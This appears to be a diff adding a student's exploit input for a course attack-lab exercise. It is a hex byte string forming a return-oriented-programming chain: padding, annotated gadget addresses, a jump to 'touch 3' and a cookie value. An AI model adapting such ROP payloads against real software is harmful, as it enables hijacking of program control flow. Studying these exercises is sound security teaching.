@@ -1,0 +1,12 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+1b 1b 40 00 00 00 00 00 /* moves rsp to rax, so we can adjust rax using addition and get to the location i've inserted cookie */
+be 1a 40 00 00 00 00 00 /* only add command for rax is 04 37, which is adding 0x28 to the last four bytes of rax */
+8a 1a 40 00 00 00 00 00 /* moves rax to rdi */
+e6 19 40 00 00 00 00 00 /* touch 3 */
+49 20 68 61 74 65 20 63 /* junk */
+6f 6d 70 75 74 65 72 20 /* junk */
+73 63 69 65 6e 63 65 2e /* junk */
+00 00 00 00 00 00 00 33 /* junk */
+35 62 62 64 30 61 38 00 /* cookie */
